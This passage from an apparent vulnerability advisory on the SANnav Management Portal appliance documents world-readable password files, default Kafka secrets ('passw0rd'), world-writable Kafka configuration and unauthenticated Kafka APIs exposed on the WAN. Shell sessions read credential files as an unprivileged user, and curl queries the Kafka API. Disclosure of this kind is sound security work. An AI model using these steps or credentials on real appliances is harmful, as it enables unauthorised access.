</pre></div>

<ul>
<li>RPfilter is configured in IPv6 but is not defined in IPv4:</li>
</ul>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>-A PREROUTING -m rpfilter --invert -j DROP
</pre></div>

<p>Interestingly, the IPv6 connectivity seems to be disabled in the <code>/etc/sysctl.d/99-sysctl.conf</code> file:</p>
<pre><code>[root@sannav-portal-v211 ~]# cat /etc/sysctl.d/99-sysctl.conf
# sysctl settings are defined through files in
# /usr/lib/sysctl.d/, /run/sysctl.d/, and /etc/sysctl.d/.
#
# Vendors settings live in /usr/lib/sysctl.d/.
# To override a whole file, create a new file with the same in
# /etc/sysctl.d/ and put new settings there. To override
# only specific settings, add a file with a lexically later
# name in /etc/sysctl.d/ and put new settings there.
#
# For more information, see sysctl.conf(5) and sysctl.d(5).
# ~~~~ IPV6 Related Configuration ~~~~
net.ipv6.conf.all.disable_ipv6=1
net.ipv6.conf.default.disable_ipv6=1
net.ipv6.conf.all.autoconf=0
net.ipv6.conf.default.autoconf=0
net.ipv6.conf.default.accept_ra=0
net.ipv6.conf.all.accept_ra=0
net.ipv6.conf.ens192.accept_ra=0
net.ipv6.conf.docker0.accept_ra=0
net.ipv6.conf.docker_gwbridge.accept_ra=0
</code></pre>
<p>When reviewing the installation log file at <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-sannav-*.log</code>, we can confirm IPv6 can be enabled or disabled during the installation:</p>
<pre><code>156 # The below properties are for IP stack preference
157 # Preferred stack is IPV4
158 java.net.preferIPv4Stack=true
159 # Preferred stack is IPV6
160 java.net.preferIPv6Addresses=false
161 # Check if user has chosen the IPV6 installation
162 dcm.ipv6.capable=false
163 ipv6.enabled=false
</code></pre>
<p>Inconsistencies in firewall rules can be exploited by an attacker to get access to an expanded attack surface using IPv6. It is common to have secure IPv4 rules and laxist IPv6 rules.</p>
<p>IPv6 can be configured by the user during the installation phase. This presents a risk because of the inconsistencies in firewall rules.</p>
<p><a id="insecure-file-permissions"></a></p>
<h2>Details - Insecure file permissions</h2>
<p>It was observed that insecure permissions are used for files containing passwords and logs.</p>
<p>An attacker with a local shell can extract passwords and compromise the appliance.</p>
<p>It is possible to extract the RADIUS configuration as any user (e.g. nobody). The file <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/security/auth.properties</code> is world-readable:</p>
<pre><code>bash-4.4$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4$ cd /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/security
bash-4.4$ ls -la 
total 32
drwxrwxr-x+  2 sannav sannav 4096 Aug 10 05:56 .
drwxrwxr-x+ 21 sannav sannav 4096 Jan  1  2022 ..       
-rwxr-xr-x+  1 sannav sannav 2562 Dec 12  2020 auth.properties
-rw-rw-r--+  1 root   root    656 Mar  6 21:23 server.zip
bash-4.4$ cat auth.properties 
[...]
# RADIUS Authentication
auth.radius.switchtosecondauth = RADIUS Servers Not Reachable

auth.radius.server.1.ip = [REDACTED]
auth.radius.server.1.port = [REDACTED]
auth.radius.server.1.authtype = [REDACTED]
auth.radius.server.1.secret = [REDACTED-PASSWORD]
auth.radius.server.1.timeout = [REDACTED]
auth.radius.server.1.retries = [REDACTED]

auth.radius.server.2.ip = [REDACTED]
[...]
</code></pre>
<p>The directory <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf</code> also contains sensitive files. By default, everything is world-readable and no SELinux policy is defined:</p>
<pre><code>bash-4.4$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4$ cd /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf
bash-4.4$ ls -la
total 532
drwxrwxr-x+ 21 sannav sannav   4096 Jan  1  2022 .
drwxrwxr-x+ 22 sannav sannav   4096 Dec 15  2020 ..
-rwxr-xr-x+  1 sannav sannav    915 Dec 12  2020 application.properties
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 backuprestore
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 cfgmgmt
drwxrwxr-x+  2 sannav sannav   4096 Jan  1  2022 elasticsearch
drwxrwxr-x+  3 sannav sannav   4096 Dec 15  2020 EULA
-rwxr-xr-x+  1 sannav sannav  16022 Dec 12  2020 EULA.txt
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 global
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 jre
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 kafka
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 logback
drwxrwxr-x+  2 sannav sannav   4096 Jan  1  2022 mibs
drwxrwxr-x+  4 sannav sannav   4096 Dec 15  2020 migrate
drwxrwxr-x+  3 sannav sannav   4096 Dec 15  2020 nbstreaming
drwxrwxr-x+  2 sannav sannav   4096 Jan  1  2022 nginx
-rwxr-xr-x+  1 sannav sannav    991 Dec 12  2020 openssl.conf
-rw-rw-r--+  1 sannav sannav  22817 Jan  1  2022 os-details.txt
drwxrwxr-x+  2 sannav sannav   4096 Jan  1  2022 postgres
drwxrwxr-x+  2 sannav sannav   4096 Jan  1  2022 prometheus
drwxrwxr-x+  3 sannav sannav   4096 Dec 15  2020 reportgenerator
-rwxr-xr-x+  1 sannav sannav 211016 Dec 12  2020 sannav-oss-attribution.txt
drwxrwxr-x+  2 sannav sannav   4096 Aug 10 05:56 security
-rw-rw-r--+  1 sannav sannav  10117 Mar  6 21:23 server.properties
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 supportsave
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 trapconfig
-rwxr-xr-x+  1 sannav sannav   2965 Dec 12  2020 trapConfigurationDefaultMapping.xml
-rwxr-xr-x+  1 sannav sannav  12264 Dec 12  2020 trapConfigurationDefault.xml
-rwxr-xr-x+  1 sannav sannav    839 Mar  6 21:23 version.properties
drwxrwxr-x+  2 sannav sannav   4096 Dec 15  2020 wso2
-rwxr-xr-x+  1 sannav sannav  33260 Dec 12  2020 wso2carbon.jks
bash-4.4$ ls -lZ
total 516
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0    915 Dec 12  2020 application.properties
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 backuprestore
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 cfgmgmt
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Jan  1  2022 elasticsearch
drwxrwxr-x+ 3 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 EULA
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0  16022 Dec 12  2020 EULA.txt
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 global
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 jre
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 kafka
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 logback
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Jan  1  2022 mibs
drwxrwxr-x+ 4 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 migrate
drwxrwxr-x+ 3 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 nbstreaming
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Jan  1  2022 nginx
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0    991 Dec 12  2020 openssl.conf
-rw-rw-r--+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0  22817 Jan  1  2022 os-details.txt
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Jan  1  2022 postgres
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Jan  1  2022 prometheus
drwxrwxr-x+ 3 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 reportgenerator
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0 211016 Dec 12  2020 sannav-oss-attribution.txt
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Aug 10 05:56 security
-rw-rw-r--+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0  10117 Mar  6 21:23 server.properties
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 supportsave
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 trapconfig
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0   2965 Dec 12  2020 trapConfigurationDefaultMapping.xml
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0  12264 Dec 12  2020 trapConfigurationDefault.xml
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0    839 Mar  6 21:23 version.properties
drwxrwxr-x+ 2 sannav sannav unconfined_u:object_r:unlabeled_t:s0   4096 Dec 15  2020 wso2
-rwxr-xr-x+ 1 sannav sannav unconfined_u:object_r:unlabeled_t:s0  33260 Dec 12  2020 wso2carbon.jks
bash-4.4$
</code></pre>
<p>Retrieving encrypted passwords from <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/server.properties</code> as <code>nobody</code>:</p>
<pre><code>bash-4.4$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4$ grep -i pass server.properties
# Password based encryption key
#WSO2 encrypted Password
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
# Default SFTP/SCP password
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
bash-4.4$ grep key server.properties
# Password based encryption key 
security.pbe.key=[REDACTED-HASHED-PASSWORD]
# SSL Certificate key file name
ssl.certificate.key=https_key.pem
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
bash-4.4$
</code></pre>
<p>Other files containing passwords in the Kafka Docker instance:</p>
<pre><code>root@sannav-portal-v211:/etc/kafka/secrets# pwd
/etc/kafka/secrets
root@sannav-portal-v211:/etc/kafka/secrets# ls -la
total 36
drwxrwxrwx. 2 root root 4096 Mar 31 23:42 .
drwxrwxrwx. 1 root root 4096 Mar 31 23:42 ..
-r--r--r--. 1 root root 1194 Mar 31 23:42 kafka.truststore.jks
-r--r--r--. 1 root root    8 Mar 31 23:42 keystore_creds
-r--r--r--. 1 root root 4751 Mar 31 23:42 sannav-portal-v211_keystore.jks
-r--r--r--. 1 root root    8 Mar 31 23:42 sslkey_creds
-r--r--r--. 1 root root    8 Mar 31 23:42 truststore_creds
root@sannav-portal-v211:/etc/kafka/secrets# ls -Z
system_u:object_r:tmpfs_t:s0 kafka.truststore.jks  system_u:object_r:tmpfs_t:s0 sannav-portal-v211_keystore.jks  system_u:object_r:tmpfs_t:s0 truststore_creds
system_u:object_r:tmpfs_t:s0 keystore_creds        system_u:object_r:tmpfs_t:s0 sslkey_creds
root@sannav-portal-v211:/etc/kafka/secrets# ls -laZ
total 36
drwxrwxrwx. 2 root root system_u:object_r:unlabeled_t:s0 4096 Mar 31 23:42 .
drwxrwxrwx. 1 root root system_u:object_r:unlabeled_t:s0 4096 Mar 31 23:42 ..
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0     1194 Mar 31 23:42 kafka.truststore.jks
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 keystore_creds
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0     4751 Mar 31 23:42 sannav-portal-v211_keystore.jks
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 sslkey_creds
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 truststore_creds
root@sannav-portal-v211:/etc/kafka/secrets# cat keystore_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat sslkey_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat truststore_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat /etc/kafka/kafka.properties
inter.broker.listener.name=PLAINTEXT
ssl.key.password=passw0rd
ssl.keystore.password=passw0rd
advertised.listeners=PLAINTEXT://10.13.3.7:19093,EXTERNAL_SSL://10.13.3.7:19094
ssl.keystore.location=/etc/kafka/secrets/sannav-portal-v211_keystore.jks
ssl.keystore.filename=sannav-portal-v211_keystore.jks
advertised.host.name=10.13.3.7
zookeeper.connect=10.13.3.7:12181
num.partitions=16
ssl.truststore.credentials=truststore_creds
ssl.keystore.credentials=keystore_creds
ssl.enabled.protocols=TLSv1.2
zookeeper.connection.timeout.ms=15000
log.retention.minutes=30
zookeeper.session.timeout.ms=15000
broker.id=1
ssl.key.credentials=sslkey_creds
offsets.topic.replication.factor=1
ssl.truststore.type=JKS
listener.security.protocol.map=PLAINTEXT:PLAINTEXT,EXTERNAL_PLAINTEXT:PLAINTEXT,EXTERNAL_SSL:SSL
ssl.keystore.type=JKS
log.dirs=/var/lib/kafka/data
ssl.truststore.filename=kafka.truststore.jks
listeners=PLAINTEXT://0.0.0.0:19093,EXTERNAL_SSL://0.0.0.0:19094
root@sannav-portal-v211:/etc/kafka/secrets#
</code></pre>
<p>Please note that the <code>passw0rd</code> passwords defined in the Kafka configuration files are not listed in CVE-2020-15382. It appears to be a new vulnerability.</p>
<p>The file <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/compose/server_properties.env</code> is also world-readable and contains passwords.</p>
<p>Using the <code>nobody</code> user to read <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/compose/server_properties.env</code>:</p>
<pre><code>[root@sannav-portal-v211 compose]# sudo -u nobody bash
bash-4.4$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4$ cat server_properties.env 
[...]
      1 #########################################################################################################################
      2 ### DCM Server properties       DCM Server properties     DCM Server properties                                      ####
      3 ###             **** PLEASE DO NOT EDIT THIS FILE WITH HAND. THIS WILL BE EDITED BY SCRIPTS                          ####
      4 ###             **** IF AT ALL YOU ARE MODIFYING THIS FILE....PLEASE ENSURE YOU DONT HAVE SPACE BEFORE AND AFTER "=" ####
      5 #########################################################################################################################
...
     35  
     36 # Password based encryption key 
     37 security.pbe.key=[REDACTED-HASHED-PASSWORD]
     38  
     39 #WSO2 encrypted Password
     40 dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
     41  
...
    109 # Default SFTP/SCP password
    110 dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
...
    152 # Kafka certificate management
    153 kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
    154 kafka.ca.name=ca-cert.pem
</code></pre>
<p>Finally, the log files are also world-readable:</p>
<pre><code>bash-4.4$ pwd
/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs
bash-4.4$ ls -la
total 5810440
drwxrwxr-x+ 12 sannav sannav     86016 Aug 10 00:06 .
drwxrwxr-x+ 22 sannav sannav      4096 Dec 15  2020 ..
[...]
-rw-rw-r--+  1 root   root    52620851 Mar 31 18:50 asyncjobscheduler-manager-2022-03-03_13-40-26-gc.log.0.current
-rw-rw-r--+  1 root   root   104858122 May 22 12:01 asyncjobscheduler-manager-2022-03-31_19-53-06-gc.log.0
-rw-rw-r--+  1 root   root   104858789 Jul  7 08:14 asyncjobscheduler-manager-2022-03-31_19-53-06-gc.log.1
-rw-rw-r--+  1 root   root    78059535 Aug 10 10:07 asyncjobscheduler-manager-2022-03-31_19-53-06-gc.log.2.current
[...]
-rw-rw-r--+  1 root   root       44634 Jul 27 00:00 asyncjobscheduler-manager.2022-07-26.0.log.gz
-rw-rw-r--+  1 root   root       44314 Jul 28 00:00 asyncjobscheduler-manager.2022-07-27.0.log.gz
-rw-rw-r--+  1 root   root       44792 Jul 29 00:00 asyncjobscheduler-manager.2022-07-28.0.log.gz
-rw-rw-r--+  1 root   root       50831 Jul 30 00:00 asyncjobscheduler-manager.2022-07-29.0.log.gz
-rw-rw-r--+  1 root   root       48250 Jul 31 00:00 asyncjobscheduler-manager.2022-07-30.0.log.gz
-rw-rw-r--+  1 root   root       45001 Aug  1 00:00 asyncjobscheduler-manager.2022-07-31.0.log.gz
-rw-rw-r--+  1 root   root       44987 Aug  2 00:00 asyncjobscheduler-manager.2022-08-01.0.log.gz
-rw-rw-r--+  1 root   root       46530 Aug  3 00:00 asyncjobscheduler-manager.2022-08-02.0.log.gz
-rw-rw-r--+  1 root   root       47830 Aug  4 00:00 asyncjobscheduler-manager.2022-08-03.0.log.gz
-rw-rw-r--+  1 root   root       47102 Aug  5 00:00 asyncjobscheduler-manager.2022-08-04.0.log.gz
-rw-rw-r--+  1 root   root       52024 Aug  6 00:00 asyncjobscheduler-manager.2022-08-05.0.log.gz
-rw-rw-r--+  1 root   root       45954 Aug  7 00:00 asyncjobscheduler-manager.2022-08-06.0.log.gz
-rw-rw-r--+  1 root   root       45408 Aug  8 00:00 asyncjobscheduler-manager.2022-08-07.0.log.gz
-rw-rw-r--+  1 root   root       45668 Aug  9 00:00 asyncjobscheduler-manager.2022-08-08.0.log.gz
-rw-rw-r--+  1 root   root       44973 Aug 10 00:00 asyncjobscheduler-manager.2022-08-09.0.log.gz
-rw-rw-r--+  1 root   root      914752 Aug 10 10:00 asyncjobscheduler-manager.log
[...]
</code></pre>
<p>The installation log file - <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-*log</code> - leaks passwords. This file is world-readable and can be read by any user:</p>
<pre><code>[root@sannav-portal-v211 logs]# ls -la /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-*log
-rw-rw-r--+ 1 sannav sannav 9930 Jan 1  2022 /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-sannav-2022_01_01_001.log
[root@sannav-portal-v211 logs]# sudo -u nobody head /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-sannav-2022_01_01_001.log
Status of the network configuration is: **SUCCESS**
docker service is currently running.
Current SANNAV installation status is : **READY**
No /sannav-portal-v210/ found in attached disk.
Copying Composing Files ...
Checking the ports availability for green feild installation
Checking ports that must be free.
Reading property from /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/version.properties
sann2.1.1
Build Label is sann2.1.1
[root@sannav-portal-v211 logs]# 
[root@sannav-portal-v211 logs]# cat /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/install-*log

...
The IPv4 address used for SAN Switch to SANnav Management Portal Server communication is 10.13.3.7
[REDACTED-HASHED-PASSWORD]
Press Enter to continue with default database password, or enter a new password manually.
Password must be between 8 to 64 characters, alphanumeric. Spaces are not allowed. Allowed special characters are ! # $ * ( )
[REDACTED-HASHED-PASSWORD]
Host Name:sannav-portal-v211
Certificate files written to:/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/nginx/https_cert.pem, /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/nginx/https_key.pem
Generated self-signed server certificate.
Press Enter to continue with default internal SFTP/SCP password, or enter a new password manually.
Password must be between 8 to 64 characters, alphanumeric. Spaces are not allowed. Allowed special characters are ! # $ * ( )
[REDACTED-HASHED-PASSWORD]
[REDACTED-HASHED-PASSWORD]
...
[REDACTED-HASHED-PASSWORD]
[REDACTED-HASHED-PASSWORD]
 Encryption of the KAFKA password is successful
</code></pre>
<p><a id="kafka-reachable-on-the-wan-interface-and-lack-of-authentication"></a></p>
<h2>Details - Kafka reachable on the WAN interface and Lack of authentication</h2>
<p>It was observed that Kafka is reachable from the WAN interface of the appliance on several ports:</p>
<ul>
<li><code>18081/tcp</code></li>
<li><code>18082/tcp</code></li>
<li><code>19094/tcp</code></li>
</ul>
<p>The official documentation regarding the Kafka configuration recommends not exposing Kafka ports on the network interfaces.</p>
<p>When reading the documentation of SANnav, this exposure appears to be a normal behavior:</p>
<p><a href="https://techdocs.broadcom.com/us/en/fibre-channel-networking/sannav/management-portal-installation-and-migration/2-2-x/v26510227/v25436141.html">https://techdocs.broadcom.com/us/en/fibre-channel-networking/sannav/management-portal-installation-and-migration/2-2-x/v26510227/v25436141.html</a>:</p>
<p><img alt="" src="images/2024-sannav-docs-fw1.png" /></p>
<p>But when confirming the network flows in the documentation files, Kafka is only supposed to be reachable by the switches:</p>
<p><a href="https://docs.broadcom.com/doc/SANnav-211x-Install-IG">https://docs.broadcom.com/doc/SANnav-211x-Install-IG</a> page 20:</p>
<p><img alt="" src="images/2024-sannav-docs-fw2.png" /></p>
<p>Furthermore, the java processes for Kafka run as root:</p>
<pre><code>[root@sannav-portal-v211 ~]# ps -auxww | grep 417993
root     4127993  6.1  2.6 25678024 1323372 ?    Ssl  Mar31 11703:50 java -Xmx1G -Xms1G -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -Djava.awt.headless=true -Xloggc:/var/log/kafka/kafkaServer-gc.log -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M -Dcom.sun.management.jmxremote=false -Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun.management.jmxremote.ssl=false -Dkafka.logs.dir=/var/log/kafka -Dlog4j.configuration=file:/etc/kafka/log4j.properties -cp /usr/bin/../share/java/kafka/*:/usr/bin/../share/java/confluent-support-metrics/*:/usr/share/java/confluent-support-metrics/* io.confluent.support.metrics.SupportedKafka /etc/kafka/kafka.properties
[root@sannav-portal-v211 ~]# ps -auxww | grep 4146085
root     1858651  0.0  0.0  12108   988 pts/0    S+   10:28   0:00 grep --color=auto 4146085
root     4146085  0.1  0.8 10493048 420532 ?     Ssl  Mar31 338:08 java -Xmx512M -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -Djava.awt.headless=true -Dcom.sun.management.jmxremote=false -Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun. management.jmxremote.ssl=false -Dschema-registry.log.dir=/usr/bin/../logs -Dlog4j.configuration=file:/etc/schema-registry/log4j.properties -cp :/usr/bin/../package-schema-registry/target/kafka-schema-registry-package-*-development/share/java/schema-registry/*:/usr/bin/../share/java/confluent-common/*:/usr/bin/../share/java/rest-utils/*:/usr/bin/../share/java/schema-registry/* io.confluent.kafka.schemaregistry.rest.SchemaRegistryMain /etc/schema-registry/schema-registry.properties
[root@sannav-portal-v211 ~]#
</code></pre>
<p>The credentials used in Kafka are very weak (<code>passw0rd</code>) and the Kafka passwords can be found in world-readable files:</p>
<pre><code>root@sannav-portal-v211:/etc/kafka/secrets# pwd
/etc/kafka/secrets
root@sannav-portal-v211:/etc/kafka/secrets# ls -la
total 36
drwxrwxrwx. 2 root root 4096 Mar 31 23:42 .
drwxrwxrwx. 1 root root 4096 Mar 31 23:42 ..
-r--r--r--. 1 root root 1194 Mar 31 23:42 kafka.truststore.jks
-r--r--r--. 1 root root    8 Mar 31 23:42 keystore_creds
-r--r--r--. 1 root root 4751 Mar 31 23:42 sannav-portal-v211_keystore.jks
-r--r--r--. 1 root root    8 Mar 31 23:42 sslkey_creds
-r--r--r--. 1 root root    8 Mar 31 23:42 truststore_creds
root@sannav-portal-v211:/etc/kafka/secrets# ls -Z
system_u:object_r:tmpfs_t:s0 kafka.truststore.jks  system_u:object_r:tmpfs_t:s0 sannav-portal-v211_keystore.jks  system_u:object_r:tmpfs_t:s0 truststore_creds
system_u:object_r:tmpfs_t:s0 keystore_creds        system_u:object_r:tmpfs_t:s0 sslkey_creds
root@sannav-portal-v211:/etc/kafka/secrets# ls -laZ
total 36
drwxrwxrwx. 2 root root system_u:object_r:unlabeled_t:s0 4096 Mar 31 23:42 .
drwxrwxrwx. 1 root root system_u:object_r:unlabeled_t:s0 4096 Mar 31 23:42 ..
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0     1194 Mar 31 23:42 kafka.truststore.jks
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 keystore_creds
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0     4751 Mar 31 23:42 sannav-portal-v211_keystore.jks
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 sslkey_creds
-r--r--r--. 1 root root system_u:object_r:tmpfs_t:s0        8 Mar 31 23:42 truststore_creds
root@sannav-portal-v211:/etc/kafka/secrets# cat keystore_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat sslkey_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat truststore_creds ; echo
passw0rd
root@sannav-portal-v211:/etc/kafka/secrets# cat /etc/kafka/kafka.properties
inter.broker.listener.name=PLAINTEXT
ssl.key.password=passw0rd
ssl.keystore.password=passw0rd
advertised.listeners=PLAINTEXT://10.13.3.7:19093,EXTERNAL_SSL://10.13.3.7:19094
ssl.keystore.location=/etc/kafka/secrets/sannav-portal-v211_keystore.jks
ssl.keystore.filename=sannav-portal-v211_keystore.jks
advertised.host.name=10.13.3.7
zookeeper.connect=10.13.3.7:12181
num.partitions=16
ssl.truststore.credentials=truststore_creds
ssl.keystore.credentials=keystore_creds
ssl.enabled.protocols=TLSv1.2
zookeeper.connection.timeout.ms=15000
log.retention.minutes=30
zookeeper.session.timeout.ms=15000
broker.id=1
ssl.key.credentials=sslkey_creds
offsets.topic.replication.factor=1
ssl.truststore.type=JKS
listener.security.protocol.map=PLAINTEXT:PLAINTEXT,EXTERNAL_PLAINTEXT:PLAINTEXT,EXTERNAL_SSL:SSL
ssl.keystore.type=JKS
log.dirs=/var/lib/kafka/data
ssl.truststore.filename=kafka.truststore.jks
listeners=PLAINTEXT://0.0.0.0:19093,EXTERNAL_SSL://0.0.0.0:19094
root@sannav-portal-v211:/etc/kafka/secrets#
</code></pre>
<p>Regarding the configuration of Kafka, the <code>/etc/kafka</code> directory inside the <code>dcm_2_1_1_kafka-1.1.y7zjzek7z1pjmbr1l7bhp4916</code> has incorrect permissions (<code>777</code>) allowing any local attacker to change the configuration.</p>
<p>The directories <code>/etc/kafka</code> and <code>/etc/kafka/secrets</code> are both <code>777</code>.</p>
<p>All the files are world-writable in <code>/etc/kafka</code>:</p>
<pre><code>[root@sannav-portal-v211 ~]# docker ps | grep kafka
9942a51dc33f        10.13.3.7:5000/cp-kafka:sann2.1.1                          "/etc/confluent/dock     4 months ago        Up 4 months                             dcm_2_1_1_kafka-1.1.y7zjzek7z1pjmbr1l7bhp4916
[root@sannav-portal-v211 ~]# docker exec -it 9942a51dc33f bash
root@sannav-portal-v211:/# cd /etc/kafka
root@sannav-portal-v211:/etc/kafka# ls -la
total 100
drwxrwxrwx. 1 root root 4096 Mar 31 23:42 .
drwxr-xr-x. 1 root root 4096 Mar 31 23:42 ..
-rw-rw-rw-. 1 root root  906 Jun  5  2019 connect-console-sink.properties
-rw-rw-rw-. 1 root root  909 Jun  5  2019 connect-console-source.properties
-rw-rw-rw-. 1 root root 5335 Jun  5  2019 connect-distributed.properties
-rw-rw-rw-. 1 root root  883 Jun  5  2019 connect-file-sink.properties
-rw-rw-rw-. 1 root root  881 Jun  5  2019 connect-file-source.properties
-rw-rw-rw-. 1 root root 1111 Jun  5  2019 connect-log4j.properties
-rw-rw-rw-. 1 root root 2276 Jun  5  2019 connect-standalone.properties
-rw-rw-rw-. 1 root root 1221 Jun  5  2019 consumer.properties
-rw-r--r--. 1 root root  974 Mar 31 23:42 kafka.properties
-rw-rw-rw-. 1 root root  960 Mar 31 23:42 log4j.properties
-rw-rw-rw-. 1 root root 1925 Jun  5  2019 producer.properties
drwxrwxrwx. 2 root root 4096 Mar 31 23:42 secrets
-rw-rw-rw-. 1 root root 8309 Jun  5  2019 server.properties
-rw-rw-rw-. 1 root root  252 Mar 31 23:42 tools-log4j.properties
-rw-rw-rw-. 1 root root 1169 Jun  5  2019 trogdor.conf
-rw-rw-rw-. 1 root root 1027 Jun  5  2019 zookeeper.properties
root@sannav-portal-v211:/etc/kafka#
</code></pre>
<p>Testing the API access, it was observed that it is possible to send JSON AVRO-formatted data into the Kafka APIs reachable on ports <code>18081</code> (HTTP) and <code>18082</code> (HTTP). These accesses provide an attacker a full write access to Kafka:</p>
<pre><code>kali% curl -s http://10.13.3.7:18081/subjects | jq .
[
  "PortMetrics",
  "StatsCollectionCompleted-value",
  "FCIPTunnelMetrics",
  "amp_iov_viol_summary",
  "fos_flow_stats",
  "FCIPCircuitMetrics",
  "Telemetry_register-value",
  "amp_dev_port_stats",
  "flow_stats"
]
kali% curl -s  http://10.13.3.7:18081/subjects/FCIPTunnelMetrics/versions/latest | jq .
{
  "subject": "FCIPTunnelMetrics",
  "version": 1,
  "id": 8,
